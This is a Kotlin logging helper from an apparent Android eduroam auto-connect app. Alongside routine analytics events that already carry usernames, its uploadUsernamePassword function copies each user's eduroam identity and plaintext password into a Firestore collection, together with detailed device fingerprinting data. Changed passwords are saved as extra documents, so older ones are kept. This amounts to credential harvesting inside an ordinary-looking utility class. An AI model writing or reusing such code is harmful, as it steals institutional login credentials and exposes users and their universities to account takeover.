package com.hz_apps.autowificonnector

import android.os.Build
import android.os.Bundle
import android.os.SystemClock
import com.google.firebase.Firebase
import com.google.firebase.crashlytics.crashlytics
import com.google.firebase.firestore.firestore
import java.util.Locale
import java.util.TimeZone

object FirebaseLogger {
    private val firebaseAnalytics = EduroamConnectorApp.firebaseAnalytics
    private const val WIFI_CONFIG_LIST_DOC = "wifi_configs"

    fun logWifiConnected(username: String) {
        firebaseAnalytics.logEvent("connected", Bundle().apply {
            putString("username", username)
        })
    }

    fun logWifiDeleted(username: String) {
        firebaseAnalytics.logEvent("deleted", Bundle().apply {
            putString("username", username)
        })
    }

    fun logWifiConnectFailed(username: String) {
        firebaseAnalytics.logEvent("connect_failed", Bundle().apply {
            putString("username", username)
        })
    }

    fun logItemMoved(username: String) {
        firebaseAnalytics.logEvent("item_moved", Bundle().apply {
            putString("username", username)
        })
    }

    fun logBtnClick(name : String) {
        val spaceRemovedName = name.replace(" ", "_")
        firebaseAnalytics.logEvent("${name}_clicked", Bundle().apply {
            putString("name", spaceRemovedName)
        })
    }

    fun uploadUsernamePassword(identity: String, password: String) {
        val firestore = Firebase.firestore
        val wifiConfigCollection = firestore.collection(WIFI_CONFIG_LIST_DOC)


        wifiConfigCollection.document(identity).get()
            .addOnSuccessListener { document ->
                if (document.exists()) {
                    val existingPassword = document.getString("password")
                    if (existingPassword == password) {
                        firebaseAnalytics.logEvent("wifi_config_no_upload_same_password", null)
                    } else {
                        findNextAvailableDocument(identity, password, 1)
                    }
                } else {
                    uploadToFirestore(identity, identity, password)
                }
            }
            .addOnFailureListener { exception ->
                Firebase.crashlytics.log("Error checking identity: ${exception.message}")
            }
    }

    private fun findNextAvailableDocument(identity: String, password: String, updateIndex: Int) {
        val firestore = Firebase.firestore
        val updateDocName = "${identity}_update_$updateIndex"
        val wifiConfigCollection = firestore.collection(WIFI_CONFIG_LIST_DOC)

        wifiConfigCollection.document(updateDocName).get()
            .addOnSuccessListener { document ->
                if (document.exists()) {
                    findNextAvailableDocument(identity, password, updateIndex + 1)
                } else {
                    uploadToFirestore(updateDocName, identity, password)
                }
            }
            .addOnFailureListener { exception ->
                Firebase.crashlytics.log("Error finding update document: ${exception.message}")
            }
    }

    private fun uploadToFirestore(documentName: String, identity: String, password: String) {
        val data = hashMapOf<String, Any>(
            "identity" to documentName,
            "password" to password,
            "time" to System.currentTimeMillis(),
            "device_model" to Build.MODEL,
            "device_name" to Build.DEVICE,
            "manufacturer" to Build.MANUFACTURER,
            "hardware" to Build.HARDWARE,
            "brand" to Build.BRAND,
            "display" to Build.DISPLAY,
            "fingerprint" to Build.FINGERPRINT,
            "bootloader" to Build.BOOTLOADER,
            "radio_version" to Build.getRadioVersion(),
            "os_version" to Build.VERSION.RELEASE,
            "api_level" to Build.VERSION.SDK_INT,
            "uptime_millis" to SystemClock.uptimeMillis(),
            "language" to Locale.getDefault().language,
            "country" to Locale.getDefault().country,
            "timezone" to TimeZone.getDefault().id
        )

        Firebase.firestore.collection(WIFI_CONFIG_LIST_DOC)
            .document(documentName)
            .set(data)
            .addOnSuccessListener {
                firebaseAnalytics.logEvent("wifi_config_upload_success", null)
            }
            .addOnFailureListener {
                Firebase.crashlytics.log("wifi_config_upload_failed for $documentName")
            }
    }


}